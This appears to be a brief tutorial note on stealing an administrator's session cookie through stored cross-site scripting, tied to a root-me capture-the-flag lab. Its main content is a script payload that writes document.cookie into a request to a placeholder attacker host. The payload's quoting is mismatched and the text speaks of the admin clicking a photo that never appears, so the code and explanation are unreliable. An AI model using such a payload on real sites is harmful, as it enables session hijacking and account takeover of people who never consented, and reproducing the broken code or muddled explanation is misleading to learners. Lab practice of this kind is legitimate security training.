Steal Admin Cookie with Xss Stored Exampl: 

Imagine that you are on a website that has a polling forum By entering a comment, your input will be placed in the DOM of the page Now, for example, you can enter a JavaScript code in the comments section and it will sit on the DOM page and be executed Now, if the admin clicks on it, the cookie will be sent to your host


  -Example Payload: 


            <script> document.write("<HOST_URL>?test='+document.cookie+'"); </script>

In this payload, the admin cookie is placed in the test parameter and when the admin clicks on the photo, his cookie is sent to the attacker.


Lab: 


https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1?lang=en&action_solution=voir&debut_affiche_solutions=9#pagination_affiche_solutions
